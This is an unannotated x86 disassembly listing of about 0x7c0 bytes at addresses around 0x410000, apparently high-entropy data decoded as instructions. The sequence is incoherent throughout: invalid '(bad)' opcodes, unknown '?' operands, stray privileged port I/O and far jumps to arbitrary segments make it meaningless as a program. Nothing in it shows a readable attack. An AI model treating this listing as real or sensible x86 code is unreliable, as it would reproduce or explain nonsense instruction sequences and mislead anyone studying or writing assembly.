  41001e:	aam    0x96
  410020:	leave  
  410021:	pop    eax
  410022:	pusha  
  410023:	in     eax,0x39
  410025:	mov    cl,0x9
  410027:	cmp    BYTE PTR [ebp-0x14],bh
  41002a:	fdiv   DWORD PTR [ecx]
  41002c:	lds    edi,FWORD PTR [esi]
  41002e:	mov    al,ds:0x92c40859
  410033:	fxtract 
  410035:	jne    0x41003e
  410037:	(bad)  
  410038:	sub    BYTE PTR [edi+eax*4+0x2645583c],dl
  41003f:	sub    al,0xed
  410041:	xor    ebx,0x3c
  410044:	xchg   ebp,eax
  410045:	fcmovb st,st(1)
  410047:	pop    edi
  410048:	test   DWORD PTR [edx+0x77345579],edi
  41004e:	outs   dx,DWORD PTR ds:[esi]
  41004f:	clc    
  410050:	xchg   esp,eax
  410051:	push   ecx
  410052:	jl     0x41005e
  410054:	mov    eax,0x6f6d6408
  410059:	rcr    DWORD PTR [edi],cl
  41005b:	fdiv   QWORD PTR [edi-0x7237894d]
  410061:	adc    edi,DWORD PTR [ebx-0x67]
  410064:	aas    
  410065:	push   ebx
  410066:	stc    
  410067:	test   eax,0xaa6f3044
  41006c:	mov    DWORD PTR [edi],0x6813c3a6
  410072:	mov    eax,ds:0x18c8e04e
  410077:	xor    eax,0x73ff1651
  41007c:	outs   dx,BYTE PTR ds:[esi]
  41007d:	cs adc ebx,eax
  410080:	mov    ebx,0x5f537760
  410085:	aas    
  410086:	jge    0x41008c
  410088:	imul   ecx,DWORD PTR [ecx+0x1cb5080],0xffffff90
  41008f:	popf   
  410090:	inc    ebp
  410091:	test   cl,dl
  410093:	(bad)  
  410094:	js     0x4100ff
  410096:	xchg   DWORD PTR [eax],esp
  410098:	pop    esi
  410099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41009a:	jns    0x41009a
  41009c:	mov    eax,0x34995d1
  4100a1:	xchg   BYTE PTR [esi+0x4849a3dc],ah
  4100a7:	xor    eax,esi
  4100a9:	cmp    edx,ecx
  4100ab:	jle    0x4100a9
  4100ad:	bound  edx,QWORD PTR [ebx+0x728e9794]
  4100b3:	cwde   
  4100b4:	cmp    esi,DWORD PTR [esi]
  4100b6:	push   0x4203c39c
  4100bb:	fstp   QWORD PTR [ebx]
  4100bd:	loope  0x4100e0
  4100bf:	mov    edi,0xf1865a8e
  4100c4:	mov    ds:0x9b19cad5,al
  4100c9:	adc    eax,0x769ca50d
  4100ce:	data16 or bh,BYTE PTR [ebp+0xa]
  4100d2:	in     eax,dx
  4100d3:	xor    al,0x22
  4100d5:	and    dh,ah
  4100d7:	push   ebx
  4100d8:	in     al,dx
  4100d9:	sub    ebp,eax
  4100db:	add    bl,ch
  4100dd:	shl    BYTE PTR [edx-0x2f4d0f02],0xe0
  4100e4:	add    edi,DWORD PTR ds:0xf27ae0f2
  4100ea:	retf   0x313c
  4100ed:	mov    dh,0xbc
  4100ef:	inc    esp
  4100f0:	ds loope 0x4100d5
  4100f3:	sub    ebp,esi
  4100f5:	mov    esi,0x39a17282
  4100fa:	stc    
  4100fb:	sbb    al,BYTE PTR [ecx+0x43]
  4100fe:	mov    eax,0xd15db93b
  410103:	aaa    
  410104:	xor    eax,0x747f27cb
  410109:	out    dx,al
  41010a:	in     al,dx
  41010b:	out    dx,al
  41010c:	mov    edx,0xb0419497
  410111:	xchg   edi,eax
  410112:	pop    ebx
  410113:	scas   al,BYTE PTR es:[edi]
  410114:	jl     0x41018e
  410116:	xor    ch,BYTE PTR [edx]
  410118:	mov    ds:0xa6695feb,eax
  41011d:	mov    WORD PTR [ebp-0x7b],?
  410120:	scas   eax,DWORD PTR es:[edi]
  410121:	mov    bh,0x82
  410123:	int3   
  410124:	push   0x2a75ccb1
  410129:	mov    al,ds:0xead2e208
  41012e:	clc    
  41012f:	ins    DWORD PTR es:[edi],dx
  410130:	ror    DWORD PTR [eax-0x3e],cl
  410133:	adc    esi,DWORD PTR [eax+edx*1-0x73]
  410137:	mov    WORD PTR [ebx+0x6d],es
  41013a:	xor    al,0xbe
  41013c:	xor    bh,BYTE PTR [esi]
  41013e:	std    
  41013f:	lods   al,BYTE PTR ds:[esi]
  410140:	ja     0x410144
  410142:	sbb    al,0xc8
  410144:	iret   
  410145:	cmp    BYTE PTR [edi],ah
  410147:	adc    ebx,DWORD PTR ds:0xe80535e
  41014d:	sub    DWORD PTR [edx],eax
  41014f:	xchg   edx,eax
  410150:	xchg   DWORD PTR [ebx],ebx
  410152:	dec    ecx
  410153:	pop    edi
  410154:	rcl    ah,0x78
  410157:	(bad)  
  410158:	(bad)  
  410159:	xor    eax,0xd978eef8
  41015e:	pop    ecx
  41015f:	sub    dl,al
  410161:	sbb    al,0x6e
  410163:	xchg   ecx,eax
  410164:	fucom  st(7)
  410166:	fdiv   DWORD PTR gs:[ecx-0x2b]
  41016a:	sti    
  41016b:	inc    eax
  41016c:	sub    cl,BYTE PTR [eax+0xf2af2a3]
  410172:	xlat   BYTE PTR ds:[ebx]
  410173:	nop
  410174:	push   ebx
  410175:	out    0xab,eax
  410177:	int3   
  410178:	and    eax,0xddb7d624
  41017d:	and    BYTE PTR [ebp+0x32],al
  410180:	pop    DWORD PTR [eax+0x3b2434e8]
  410186:	or     dh,0x81
  410189:	sbb    eax,0x2cfe726
  41018e:	sar    BYTE PTR [ecx],1
  410190:	js     0x4101b6
  410192:	into   
  410193:	sub    DWORD PTR [ecx+0x22],ebp
  410196:	js     0x4101c7
  410198:	mov    ch,0xc
  41019a:	add    eax,0xfe641fc5
  41019f:	sub    al,0x57
  4101a1:	jmp    0x31fbc9e8
  4101a6:	out    dx,eax
  4101a7:	and    eax,DWORD PTR [edx-0x2e9bc835]
  4101ad:	xchg   ebp,eax
  4101ae:	aaa    
  4101af:	and    esp,DWORD PTR [ebx-0x702df769]
  4101b5:	cdq    
  4101b6:	cmp    al,0x27
  4101b8:	mov    eax,esi
  4101ba:	in     al,dx
  4101bb:	test   al,0x16
  4101bd:	adc    eax,0xb08b1c1c
  4101c2:	xchg   esi,eax
  4101c3:	ror    DWORD PTR [ebp+0x77e33757],cl
  4101c9:	shl    ah,cl
  4101cb:	xchg   ebp,eax
  4101cc:	fnstsw WORD PTR [ecx+0x3e]
  4101cf:	test   eax,0x61740650
  4101d4:	ds jmp 0x9fff:0x509598bf
  4101dc:	sub    al,0xa8
  4101de:	mov    edx,0x7ddd14e8
  4101e3:	jg     0x4101e5
  4101e5:	mov    ecx,0x14341cf5
  4101ea:	fiadd  WORD PTR cs:[ebx+ebp*2]
  4101ee:	pop    eax
  4101ef:	fbld   TBYTE PTR [edx+0x6d]
  4101f2:	stc    
  4101f3:	dec    eax
  4101f4:	in     eax,0x71
  4101f6:	sbb    al,BYTE PTR [ecx-0xd]
  4101f9:	push   cs
  4101fa:	cli    
  4101fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101fc:	sub    cl,bl
  4101fe:	mov    eax,ds:0xcb506e61
  410203:	int    0xfa
  410205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410206:	fcmovnb st,st(5)
  410208:	pop    ecx
  410209:	outs   dx,DWORD PTR ds:[esi]
  41020a:	test   eax,0x724b327b
  41020f:	xchg   edi,eax
  410210:	xchg   ecx,eax
  410211:	clc    
  410212:	fmul   DWORD PTR [ebp+0x9b72f7b]
  410218:	pop    ecx
  410219:	and    ebx,eax
  41021b:	int3   
  41021c:	mov    eax,0x57a47f8d
  410221:	pop    esi
  410222:	lds    edx,FWORD PTR [edi]
  410224:	push   ds
  410225:	cmp    eax,DWORD PTR [esi+0x772eabc5]
  41022b:	daa    
  41022c:	xor    ebp,DWORD PTR [edx+edi*8]
  41022f:	cmp    al,0xc6
  410231:	jb     0x410264
  410233:	cmp    al,0xf2
  410235:	pop    ecx
  410236:	and    al,0x74
  410238:	push   ss
  410239:	mov    ch,0x85
  41023b:	data16 cld 
  41023d:	fdiv   DWORD PTR [edx]
  41023f:	sub    ah,ch
  410241:	push   esi
  410242:	test   al,0x2
  410244:	xchg   esi,eax
  410245:	xchg   edi,eax
  410246:	xchg   ebp,eax
  410247:	mov    bl,0x83
  410249:	mov    dh,0x8b
  41024b:	cmp    BYTE PTR [ebp+0x38689dc1],cl
  410251:	nop
  410252:	dec    ecx
  410253:	adc    BYTE PTR [ebx],0x23
  410256:	out    dx,eax
  410257:	test   eax,0x5801b126
  41025c:	(bad)  
  41025d:	int3   
  41025e:	test   ecx,edx
  410260:	sti    
  410261:	adc    DWORD PTR [edi-0x2a],ebx
  410264:	stos   DWORD PTR es:[edi],eax
  410265:	es out dx,eax
  410267:	xchg   DWORD PTR [ebx-0x1c],edx
  41026a:	and    DWORD PTR [edi+0x35ba3870],eax
  410270:	inc    ch
  410272:	bound  edx,QWORD PTR ds:0xdb2e261c
  410278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410279:	adc    eax,0xb234c313
  41027e:	pushf  
  41027f:	cdq    
  410280:	push   edx
  410281:	jge    0x4102df
  410283:	bound  esp,QWORD PTR [edx-0x72164719]
  410289:	ret    0x3971
  41028c:	(bad)  
  41028d:	jmp    0x130323ab
  410292:	mov    bh,0x74
  410294:	cmp    DWORD PTR [eax+0x5e],esi
  410297:	loope  0x4102bf
  410299:	cmp    bh,dl
  41029b:	sub    eax,0x35648cbf
  4102a0:	sub    eax,0xcd1f0765
  4102a5:	mov    bh,0xfe
  4102a7:	add    bh,BYTE PTR fs:0x20341e8d
  4102ae:	fld    QWORD PTR [ebx+0x51]
  4102b1:	test   eax,0xead0cdc7
  4102b6:	cli    
  4102b7:	mov    eax,0x773d8255
  4102bc:	inc    esi
  4102bd:	frstor [ecx+0x61]
  4102c0:	stos   DWORD PTR es:[edi],eax
  4102c1:	jo     0x41032e
  4102c3:	xor    al,0x80
  4102c5:	call   0x7758:0xa6d16bcb
  4102cc:	xor    BYTE PTR [ebx-0x46],ah
  4102cf:	cmp    ecx,DWORD PTR [edi]
  4102d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102d3:	cld    
  4102d4:	add    al,0x73
  4102d6:	or     bl,dl
  4102d8:	inc    ebp
  4102d9:	cmc    
  4102da:	out    0xd5,al
  4102dc:	mov    ss,WORD PTR [edx-0x11]
  4102df:	inc    ebp
  4102e0:	leave  
  4102e1:	int    0xce
  4102e3:	add    DWORD PTR [edi+0x79],eax
  4102e6:	retf   
  4102e7:	push   ecx
  4102e8:	add    bh,bh
  4102ea:	jne    0x410311
  4102ec:	adc    DWORD PTR [esi+0x42],edi
  4102ef:	inc    ecx
  4102f0:	xchg   edi,eax
  4102f1:	cmp    al,0xcb
  4102f3:	mov    ch,0x6d
  4102f5:	add    DWORD PTR [ebx+0x2964c49c],esi
  4102fb:	xchg   esi,eax
  4102fc:	cs jo  0x410338
  4102ff:	stc    
  410300:	pop    ebx
  410301:	sbb    DWORD PTR [esi-0x7f59e718],esi
  410307:	sbb    eax,0xda99909b
  41030c:	pop    ecx
  41030d:	push   esi
  41030e:	add    dl,al
  410310:	inc    ebp
  410311:	mov    ?,WORD PTR ds:0x4bfafe61
  410317:	dec    esi
  410318:	clc    
  410319:	js     0x4102f3
  41031b:	fs hlt 
  41031d:	jno    0x4102df
  41031f:	push   esp
  410320:	loope  0x410376
  410322:	fbld   TBYTE PTR [eax]
  410324:	mov    esp,DWORD PTR [edx+esi*4]
  410327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410328:	add    edx,DWORD PTR [ecx]
  41032a:	jnp    0x41039f
  41032c:	or     bl,cl
  41032e:	fcom   QWORD PTR [ecx+0x35]
  410331:	mov    esi,ds
  410333:	xor    DWORD PTR [esi-0x69],edi
  410336:	shr    DWORD PTR [edi+0x21],0xaa
  41033a:	scas   al,BYTE PTR es:[edi]
  41033b:	rcr    ah,1
  41033d:	div    DWORD PTR [eax-0x74]
  410340:	pop    ebx
  410341:	shr    BYTE PTR [edi],0xff
  410344:	or     al,0xcb
  410346:	xor    al,BYTE PTR [edx-0x7c]
  410349:	(bad)  
  41034a:	aaa    
  41034b:	push   ebx
  41034c:	add    ah,dh
  41034e:	and    ecx,DWORD PTR [ebx-0x3f]
  410351:	jnp    0x410326
  410353:	sar    bl,1
  410355:	mov    DWORD PTR [ebx+edx*1-0x35],ebx
  410359:	cdq    
  41035a:	dec    ebp
  41035b:	daa    
  41035c:	outs   dx,BYTE PTR ds:[esi]
  41035d:	mov    ecx,0xf53cbeaa
  410362:	xchg   esi,eax
  410363:	aas    
  410364:	or     bh,cl
  410366:	and    DWORD PTR [ecx+0x2a],ecx
  410369:	inc    esi
  41036a:	gs std 
  41036c:	es xchg esi,eax
  41036e:	stos   BYTE PTR es:[edi],al
  41036f:	xchg   DWORD PTR [ecx],ecx
  410371:	mov    BYTE PTR [eax+0x198fc417],ch
  410377:	fstp   st(1)
  410379:	xor    eax,0x74ac292d
  41037e:	cwde   
  41037f:	pop    es
  410380:	or     al,0xdf
  410382:	push   ebp
  410383:	push   ebx
  410384:	sar    BYTE PTR [eax-0x3c],1
  410387:	xchg   esp,eax
  410388:	xor    eax,0xd08ba69f
  41038d:	inc    ebp
  41038e:	out    dx,al
  41038f:	add    eax,0x2b7da3db
  410394:	dec    ebx
  410395:	adc    BYTE PTR [edi+0x59],bh
  410398:	int    0x68
  41039a:	jl     0x410394
  41039c:	ror    cl,1
  41039e:	loopne 0x41040e
  4103a0:	add    DWORD PTR [edx],eax
  4103a2:	inc    ecx
  4103a3:	mov    ebx,0xf571df86
  4103a8:	ds in  al,0x83
  4103ab:	mov    ecx,0x393687ea
  4103b0:	push   eax
  4103b1:	jp     0x4103ad
  4103b3:	imul   edi,DWORD PTR ds:0xd77a5f1b,0xb752ae35
  4103bd:	mov    ah,0x60
  4103bf:	test   al,0x3c
  4103c1:	pop    esp
  4103c2:	ja     0x410399
  4103c4:	push   ebx
  4103c5:	push   0x8533f26a
  4103ca:	scas   al,BYTE PTR es:[edi]
  4103cb:	jp     0x410414
  4103cd:	dec    ebp
  4103ce:	or     eax,0x1e24ed5e
  4103d3:	inc    ecx
  4103d4:	inc    edi
  4103d5:	add    cl,BYTE PTR [ebx-0x42]
  4103d8:	shr    eax,0xec
  4103db:	shr    BYTE PTR [eax],0x87
  4103de:	int3   
  4103df:	xor    eax,0xd5f836ba
  4103e4:	jecxz  0x410373
  4103e6:	sar    DWORD PTR [esi+0x7df8bb47],1
  4103ec:	jne    0x4103f4
  4103ee:	ja     0x4103b0
  4103f0:	mov    DWORD PTR [ecx-0x452d1ed4],edx
  4103f6:	mov    dl,0x30
  4103f8:	sbb    ch,BYTE PTR [eax]
  4103fa:	pop    ss
  4103fb:	sbb    eax,0xee92c2a9
  410400:	pop    ss
  410401:	inc    ebp
  410402:	and    BYTE PTR [edi+0x6b8e66f5],bh
  410408:	sub    eax,0xd8404616
  41040d:	cmp    ch,BYTE PTR [eax+0x45]
  410410:	loopne 0x410453
  410412:	mov    eax,ds:0x18751ad6
  410417:	mov    al,0x23
  410419:	push   esp
  41041a:	js     0x4103bd
  41041c:	cmp    DWORD PTR [ecx+0x3fcca10c],edi
  410422:	push   cs
  410423:	fidivr DWORD PTR [ebp-0x39]
  410426:	mov    al,ds:0x26a844b4
  41042b:	sub    al,0x6f
  41042d:	cli    
  41042e:	sbb    eax,0x5dec583c
  410433:	sub    ebx,DWORD PTR [edi-0x1e]
  410436:	stos   DWORD PTR es:[edi],eax
  410437:	jns    0x410414
  410439:	fisub  WORD PTR [edx-0x225bc71c]
  41043f:	icebp  
  410440:	mov    BYTE PTR [edi+0x7],0x1f
  410444:	push   ds
  410445:	xor    BYTE PTR [edi-0x67],dh
  410448:	jecxz  0x410454
  41044a:	dec    ecx
  41044b:	mov    ds:0x2df53793,al
  410450:	jae    0x410432
  410452:	dec    eax
  410453:	ret    
  410454:	call   DWORD PTR [edi]
  410456:	outs   dx,DWORD PTR fs:[esi]
  410458:	or     BYTE PTR [ecx+0x6e7f709c],0x1c
  41045f:	inc    ebx
  410460:	into   
  410461:	jae    0x410404
  410463:	call   0x47eac9d3
  410468:	sub    DWORD PTR [edx+0x25],esp
  41046b:	aam    0x37
  41046d:	pop    esp
  41046e:	jmp    0x838fa36c
  410473:	sbb    al,0x5c
  410475:	pop    ebp
  410476:	pop    ss
  410477:	jbe    0x410450
  410479:	sbb    eax,DWORD PTR [ebp+0x588ed68a]
  41047f:	stos   DWORD PTR es:[edi],eax
  410480:	pop    es
  410481:	jbe    0x41045a
  410483:	inc    edi
  410484:	loop   0x41046d
  410486:	aaa    
  410487:	mov    edx,0x31bf9254
  41048c:	push   0xffffff93
  41048e:	and    BYTE PTR [edx-0x217fb9e6],bl
  410494:	mov    edx,0x77335ee5
  410499:	jg     0x4104e4
  41049b:	pop    edi
  41049c:	cli    
  41049d:	pop    es
  41049e:	xchg   ecx,eax
  41049f:	sub    al,ch
  4104a1:	and    eax,0x9c54cc45
  4104a6:	mov    eax,ds:0x8bbf6e44
  4104ab:	inc    eax
  4104ac:	hlt    
  4104ad:	(bad)  
  4104ae:	jnp    0x410525
  4104b0:	fmul   st(0),st
  4104b2:	adc    BYTE PTR [edx],ah
  4104b4:	popa   
  4104b5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104b7:	icebp  
  4104b8:	dec    esi
  4104b9:	pop    edi
  4104ba:	xchg   BYTE PTR [ebx-0x195c116f],al
  4104c0:	xchg   ebx,eax
  4104c1:	xchg   ebp,eax
  4104c2:	enter  0x1a7f,0x69
  4104c6:	retf   
  4104c7:	cli    
  4104c8:	jbe    0x41044c
  4104ca:	xchg   BYTE PTR [edx-0x34],al
  4104cd:	dec    eax
  4104ce:	leave  
  4104cf:	add    BYTE PTR [eax+0x422a7e],cl
  4104d5:	xor    edi,DWORD PTR [ecx+ebp*4]
  4104d8:	mov    al,ds:0xc84e31a7
  4104dd:	dec    edx
  4104de:	xchg   edx,eax
  4104df:	fcomp  QWORD PTR [ecx+0x6]
  4104e2:	(bad)  
  4104e3:	add    esp,DWORD PTR [ebp+0x2f]
  4104e6:	cs push edx
  4104e8:	mov    ah,0x8e
  4104ea:	push   esi
  4104eb:	repnz gs pop ss
  4104ee:	xchg   edi,eax
  4104ef:	mov    ch,0x6f
  4104f1:	mov    ah,0xdb
  4104f3:	push   ss
  4104f4:	sub    al,0xeb
  4104f6:	push   ds
  4104f7:	mov    DWORD PTR [ecx*4+0x70aaf14c],eax
  4104fe:	xchg   ebx,eax
  4104ff:	in     al,dx
  410500:	loopne 0x4104fc
  410502:	div    BYTE PTR [ebp+0x332cfa8f]
  410508:	(bad)  
  41050a:	fwait
  41050b:	retf   0xe062
  41050e:	and    BYTE PTR [ecx],ah
  410510:	out    0x32,al
  410512:	mov    ah,0xfd
  410514:	inc    edx
  410515:	mov    ds:0x412ed2f3,al
  41051a:	mov    cl,0xc9
  41051c:	push   edx
  41051d:	(bad)  
  41051e:	adc    bl,BYTE PTR [ebx+0x2d9610c0]
  410524:	loope  0x4104f5
  410526:	arpl   WORD PTR cs:[eax+0x2e7b118c],cx
  41052d:	loop   0x410509
  41052f:	xor    al,0xe6
  410531:	daa    
  410532:	push   0x3eb74b42
  410537:	bound  ecx,QWORD PTR [edx-0x1c126cd5]
  41053d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41053e:	sbb    al,0x93
  410541:	or     edx,DWORD PTR [ebx]
  410543:	cmp    BYTE PTR [edi-0x103ba6ec],ah
  410549:	sbb    al,0x7a
  41054b:	mov    edx,0xd136671e
  410550:	push   0xe95eba00
  410555:	jl     0x4105be
  410557:	out    dx,al
  410558:	outs   dx,DWORD PTR ds:[esi]
  410559:	mov    esp,0x15c9a298
  41055e:	aas    
  41055f:	je     0x4104fe
  410561:	cdq    
  410562:	fist   DWORD PTR [esi]
  410564:	leave  
  410565:	adc    BYTE PTR [ebx],0x69
  410568:	cdq    
  410569:	into   
  41056a:	cli    
  41056b:	add    BYTE PTR [edi-0x6f],0x71
  41056f:	ret    0xa6c1
  410572:	sbb    BYTE PTR [ebx],bl
  410574:	push   0xc2e67ff7
  410579:	lods   eax,DWORD PTR ds:[esi]
  41057a:	pop    esi
  41057b:	xchg   esi,eax
  41057c:	xor    edx,DWORD PTR [ecx]
  41057e:	enter  0x8c8b,0xb7
  410582:	xor    DWORD PTR [ebp+ecx*2+0x5e],0xffffff96
  410587:	loopne 0x4105b4
  410589:	inc    esi
  41058a:	push   ss
  41058b:	cmp    DWORD PTR [esi-0x24],ebx
  41058e:	ins    DWORD PTR es:[edi],dx
  41058f:	mov    esi,DWORD PTR [edx+0x870aa2d]
  410595:	fst    QWORD PTR [ecx-0x24]
  410598:	xor    edx,DWORD PTR [eax-0x2a]
  41059b:	stc    
  41059c:	ss pop es
  41059e:	pop    ebx
  41059f:	dec    BYTE PTR [edi*2+0x45fa7e48]
  4105a6:	pop    edx
  4105a7:	cli    
  4105a8:	xchg   edx,eax
  4105a9:	dec    esp
  4105aa:	stos   BYTE PTR es:[edi],al
  4105ab:	inc    esi
  4105ac:	add    eax,0xe62cde11
  4105b1:	(bad)  
  4105b2:	pop    edx
  4105b3:	add    DWORD PTR [esi-0x20e368c6],ecx
  4105b9:	pop    edx
  4105ba:	inc    edx
  4105bb:	push   ebp
  4105bc:	div    DWORD PTR [ebx-0x55]
  4105bf:	jb     0x4105ed
  4105c1:	cld    
  4105c2:	pop    esi
  4105c3:	gs xchg edx,eax
  4105c5:	mov    dh,0xa4
  4105c7:	add    eax,0xe8e7e30
  4105cc:	dec    esp
  4105cd:	hlt    
  4105ce:	sbb    BYTE PTR [edx+0x70],dl
  4105d1:	outs   dx,BYTE PTR ds:[esi]
  4105d2:	mov    eax,DWORD PTR [edx+0x1281a59]
  4105d8:	neg    DWORD PTR [edx]
  4105da:	xor    dh,BYTE PTR [edi+0x6c9394bf]
  4105e0:	popf   
  4105e1:	and    ebp,edx
  4105e3:	imul   ebp,DWORD PTR [edx+0x27],0x7de70d5d
  4105ea:	call   0xe15a:0xfd7f833b
  4105f1:	mul    ecx
  4105f3:	data16 jp 0x41058a
  4105f6:	ins    BYTE PTR es:[edi],dx
  4105f7:	inc    eax
  4105f8:	aad    0x24
  4105fa:	(bad)  
  4105fb:	and    esi,eax
  4105fd:	xchg   ebp,eax
  4105fe:	jo     0x4105b7
  410600:	ds stc 
  410602:	mov    cl,0x70
  410604:	pop    esi
  410605:	xor    BYTE PTR fs:[ecx+0x2b],cl
  410609:	inc    esi
  41060a:	in     eax,0x98
  41060c:	test   BYTE PTR [ebp+0x71f0fbce],dh
  410612:	and    eax,0x68d4220c
  410617:	fist   WORD PTR [ecx-0x63]
  41061a:	cwde   
  41061b:	pop    eax
  41061c:	push   0xd3ef42d4
  410621:	(bad)  
  410622:	xchg   esp,eax
  410623:	aad    0x6e
  410625:	mov    al,0x73
  410627:	repnz sub edx,DWORD PTR [ebx+edx*2+0x74]
  41062c:	inc    edx
  41062d:	sti    
  41062e:	jae    0x4105c5
  410630:	ins    DWORD PTR es:[edi],dx
  410631:	into   
  410632:	mov    ds:0xb80c992a,eax
  410637:	xchg   BYTE PTR [ecx-0x9],bh
  41063a:	sti    
  41063b:	in     eax,dx
  41063c:	mov    bx,0x2010
  410640:	cmp    BYTE PTR [esi-0x4a19095e],dl
  410646:	inc    ebx
  410647:	inc    edi
  410648:	mov    esi,0x7c168329
  41064d:	repnz mov ecx,DWORD PTR [edi+0x7c]
  410651:	xchg   esp,eax
  410652:	(bad)  
  410653:	dec    ebx
  410654:	inc    ebx
  410655:	jnp    0x41068e
  410657:	cmp    eax,DWORD PTR [edi]
  410659:	in     al,0x19
  41065b:	add    BYTE PTR [edx+0x13246608],dl
  410661:	jle    0x410665
  410663:	lods   eax,DWORD PTR ds:[esi]
  410664:	nop
  410665:	xor    al,0x8
  410667:	pusha  
  410668:	lock mov ebx,0xa199f6e9
  41066e:	mov    al,0x19
  410670:	int3   
  410671:	je     0x41067f
  410673:	dec    eax
  410674:	fwait
  410675:	push   eax
  410676:	or     BYTE PTR [eax+0x5b],cl
  410679:	mov    cl,0xc3
  41067b:	test   edi,ecx
  41067d:	mov    ah,BYTE PTR [edx+0x428876a0]
  410683:	fidiv  DWORD PTR [ebx-0x4678e953]
  410689:	sub    al,0x82
  41068b:	push   edi
  41068c:	retf   0xff6a
  41068f:	inc    esi
  410690:	push   0x6c2a87fd
  410695:	rol    BYTE PTR [ebx-0x2ada069d],cl
  41069b:	(bad)  
  41069c:	sub    eax,ebp
  41069e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41069f:	adc    al,0xad
  4106a1:	stos   BYTE PTR es:[edi],al
  4106a2:	adc    esi,DWORD PTR [eax]
  4106a4:	in     al,0xcd
  4106a6:	and    eax,0x115e3f87
  4106ab:	inc    eax
  4106ac:	retf   0x22c6
  4106af:	je     0x410636
  4106b1:	or     ecx,ecx
  4106b3:	daa    
  4106b4:	enter  0xf6a8,0xa3
  4106b8:	sbb    DWORD PTR [ebx],ecx
  4106ba:	xor    edx,ebx
  4106bc:	push   eax
  4106bd:	rcr    DWORD PTR [ebp-0x627c5454],1
  4106c3:	push   0x1f
  4106c5:	stc    
  4106c6:	pop    es
  4106c7:	ja     0x410742
  4106c9:	fidiv  WORD PTR [eax]
  4106cb:	das    
  4106cc:	(bad)  [ebp-0x1521cf64]
  4106d2:	cwde   
  4106d3:	mov    eax,cs
  4106d5:	cmp    BYTE PTR [edi],ah
  4106d7:	adc    DWORD PTR [edx-0x5],edi
  4106da:	dec    esp
  4106db:	sbb    ebx,DWORD PTR [ecx-0x58]
  4106de:	add    eax,DWORD PTR [edi]
  4106e0:	adc    edx,DWORD PTR [ebx]
  4106e2:	xor    eax,0x2331425e
  4106e7:	aad    0x55
  4106e9:	imul   ebx,DWORD PTR [esi-0x2975012a],0x1
  4106f0:	sub    BYTE PTR [ecx],dh
  4106f2:	cwde   
  4106f3:	xchg   ebx,eax
  4106f4:	pushf  
  4106f5:	shl    BYTE PTR [edi-0x27210d6],cl
  4106fb:	and    BYTE PTR [edx+ebp*8],dl
  4106fe:	sahf   
  4106ff:	cmp    al,dh
  410701:	in     al,0x4d
  410703:	(bad)  
  410704:	(bad)  
  410705:	shl    BYTE PTR [ebx-0x1d4c528],1
  41070b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41070c:	inc    eax
  41070d:	and    edx,DWORD PTR [edi]
  41070f:	loop   0x41074a
  410711:	pop    ss
  410712:	(bad)
  410715:	adc    al,0x54
  410717:	add    al,BYTE PTR [eax]
  410719:	rcl    DWORD PTR [edi+edi*4-0x68],0xae
  41071e:	mov    al,ds:0xa3a701d5
  410723:	add    DWORD PTR ds:0xe0c3041a,0x9a20b653
  41072d:	outs   dx,DWORD PTR ds:[esi]
  41072e:	shr    DWORD PTR [eax+0x21],0x39
  410732:	push   eax
  410733:	sbb    BYTE PTR [eax+0x78],bl
  410736:	sbb    eax,0xe11cb399
  41073b:	call   0x9949546d
  410740:	loopne 0x4107a1
  410742:	scas   al,BYTE PTR es:[edi]
  410743:	cmp    eax,0xa0e08b6b
  410748:	fiadd  DWORD PTR [eax]
  41074a:	xlat   BYTE PTR ds:[ebx]
  41074b:	mov    bl,0xc3
  41074d:	jmp    0x9ffd:0xdcbf4191
  410754:	xchg   esi,eax
  410755:	lahf   
  410756:	sbb    ch,BYTE PTR [ecx]
  410758:	or     DWORD PTR [ebx-0x74],edi
  41075b:	jmp    0x41076a
  41075d:	in     eax,0x82
  41075f:	xor    DWORD PTR [edx],eax
  410761:	cmp    dl,BYTE PTR es:[esi+ebx*2-0x3068dda0]
  410769:	pop    esi
  41076a:	retf   
  41076b:	inc    edx
  41076c:	(bad)  
  41076d:	(bad)  
  41076e:	cmp    bl,BYTE PTR [ebp+0x3c]
  410771:	sbb    esi,ecx
  410773:	daa    
  410774:	cmc    
  410775:	repz clc 
  410777:	(bad)  
  410778:	lock cdq 
  41077a:	push   ecx
  41077b:	(bad)  
  41077c:	cs call 0x15d7:0xbf443c4
  410784:	sub    eax,0x8d58d4b2
  410789:	popa   
  41078a:	jge    0x410789
  41078c:	adc    DWORD PTR [edx],esi
  41078e:	add    DWORD PTR [edx],ebp
  410790:	jb     0x410790
  410792:	jno    0x4107e5
  410794:	pop    es
  410795:	pop    edi
  410796:	xchg   ecx,eax
  410797:	inc    edx
  410798:	adc    BYTE PTR [eax-0x5e137f0d],dh
  41079e:	adc    al,0x19
  4107a0:	adc    esp,edx
  4107a2:	jo     0x410735
  4107a4:	push   DWORD PTR [ebx+edx*4+0x23]
  4107a8:	cmp    eax,0xe510e702
  4107ad:	sbb    DWORD PTR [edx+ebp*8],esp
  4107b0:	cmp    eax,0x5fa0795b
  4107b5:	rcl    BYTE PTR [edx],cl
  4107b7:	jnp    0x4107d8
  4107b9:	mov    esp,0xc40653dd
  4107be:	int    0xea
  4107c0:	cld    
  4107c1:	or     cl,BYTE PTR [ecx]
  4107c3:	xlat   BYTE PTR ds:[ebx]
  4107c4:	icebp  
  4107c5:	lods   al,BYTE PTR ds:[esi]
  4107c6:	sti    
  4107c7:	out    0xf4,al
  4107c9:	xchg   edx,eax
  4107ca:	mov    ah,0xb1
  4107cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107cd:	pop    es
  4107ce:	aad    0x1c
  4107d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107d1:	push   es
  4107d2:	cmp    eax,0x6abdabc6
  4107d7:	out    0xc2,al
  4107d9:	xchg   ecx,eax
  4107da:	adc    eax,0x7e49792d
  4107df:	cmc    
  4107e0:	mov    esp,0x9d8ca93c
